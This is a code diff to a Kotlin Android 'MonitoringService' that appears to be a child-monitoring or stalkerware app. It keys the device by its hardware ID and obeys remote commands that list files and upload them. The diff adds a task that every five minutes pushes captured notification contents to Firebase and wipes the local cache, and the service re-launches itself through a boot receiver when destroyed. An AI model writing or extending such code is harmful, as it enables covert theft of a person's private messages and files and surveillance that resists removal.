@@ -19,16 +19,11 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.Uri
 import android.net.wifi.WifiManager
-import android.os.BatteryManager
-import android.os.Build
-import android.os.Environment
-import android.os.Handler
-import android.os.IBinder
-import android.os.Looper
-import android.os.PowerManager
+import android.os.*
 import android.provider.Settings
 import android.util.Base64
 import android.util.Log
+import android.util.Size
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.LocationServices
@@ -44,6 +39,7 @@ import io.ktor.server.response.*
 import io.ktor.server.routing.*
 import io.ktor.server.application.*
 import io.ktor.http.*
+import org.json.JSONArray
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.net.InetAddress
@@ -57,6 +53,7 @@ class MonitoringService : Service() {
     private var httpServer: ApplicationEngine? = null
     
     private val handler = Handler(Looper.getMainLooper())
+    
     private val statusUpdater = object : Runnable {
         override fun run() {
             updateLiveStatus()
@@ -64,10 +61,17 @@ class MonitoringService : Service() {
         }
     }
 
+    private val autoSyncTask = object : Runnable {
+        override fun run() {
+            syncLogsToFirebase()
+            handler.postDelayed(this, 5 * 60 * 1000)
+        }
+    }
+
     @SuppressLint("HardwareIds")
     override fun onCreate() {
         super.onCreate()
-        childId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        childId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             startForeground(
@@ -82,6 +86,35 @@ class MonitoringService : Service() {
         setupCommandListener()
         startHttpServer()
         handler.post(statusUpdater)
+        handler.postDelayed(autoSyncTask, 60000)
+    }
+
+    private fun syncLogsToFirebase() {
+        try {
+            val logFile = File(filesDir, "notifs_cache.json")
+            if (!logFile.exists()) return
+
+            val logs = logFile.readText()
+            val jsonArray = JSONArray(logs)
+            if (jsonArray.length() == 0) return
+
+            val notifsRef = database.child("notifs").child(childId)
+            for (i in 0 until jsonArray.length()) {
+                val obj = jsonArray.getJSONObject(i)
+                val map = mutableMapOf<String, Any>()
+                val keys = obj.keys()
+                while (keys.hasNext()) {
+                    val key = keys.next()
+                    map[key] = obj.get(key)
+                }
+                notifsRef.push().setValue(map)
+            }
+
+            logFile.writeText("[]")
+            Log.d("MonitoringService", "Sincronización de logs completada")
+        } catch (e: Exception) {
+            Log.e("MonitoringService", "Error en sync: ${e.message}")
+        }
     }
 
     private fun startHttpServer() {
@@ -157,6 +190,7 @@ class MonitoringService : Service() {
                     when (command) {
                         "GET_FILES" -> sendFilesList(path)
                         "UPLOAD_FILE" -> uploadFileToStorage(path)
+                        "SYNC_NOW" -> syncLogsToFirebase()
                     }
                 }
             }
@@ -218,12 +252,12 @@ class MonitoringService : Service() {
     @Suppress("DEPRECATION")
     private fun getWifiName(context: Context): String {
         return try {
-            val manager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            val manager = context.applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
             val info = manager.connectionInfo
             if (info != null && info.ssid != "<unknown ssid>") {
                 info.ssid.replace("\"", "")
             } else {
-                val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+                val cm = context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
                 val network = cm.activeNetwork
                 val capabilities = cm.getNetworkCapabilities(network)
                 if (capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
@@ -234,7 +268,7 @@ class MonitoringService : Service() {
                     "Sin Internet"
                 }
             }
-        } catch (e: Exception) {
+        } catch (_: Exception) {
             "Desconocida"
         }
     }
@@ -267,7 +301,7 @@ class MonitoringService : Service() {
     private fun generateThumbnailBase64(file: File): String? {
         return try {
             val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                ThumbnailUtils.createImageThumbnail(file, android.util.Size(100, 100), null)
+                ThumbnailUtils.createImageThumbnail(file, Size(100, 100), null)
             } else {
                 ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(file.absolutePath), 100, 100)
             }
@@ -284,14 +318,7 @@ class MonitoringService : Service() {
     private fun uploadFileToStorage(path: String) {
         val file = File(path)
         val fileName = file.name
-        if (!file.exists() || file.isDirectory) {
-            database.child("file_ready").child(childId).setValue(mapOf(
-                "name" to fileName,
-                "status" to "error",
-                "message" to "No se pudo leer el archivo"
-            ))
-            return
-        }
+        if (!file.exists() || file.isDirectory) return
 
         database.child("file_ready").child(childId).setValue(mapOf(
             "name" to fileName,
@@ -325,6 +352,7 @@ class MonitoringService : Service() {
         super.onDestroy()
         httpServer?.stop(1000, 5000)
         handler.removeCallbacks(statusUpdater)
+        handler.removeCallbacks(autoSyncTask)
         val broadcastIntent = Intent(this, BootReceiver::class.java)
         sendBroadcast(broadcastIntent)
     }
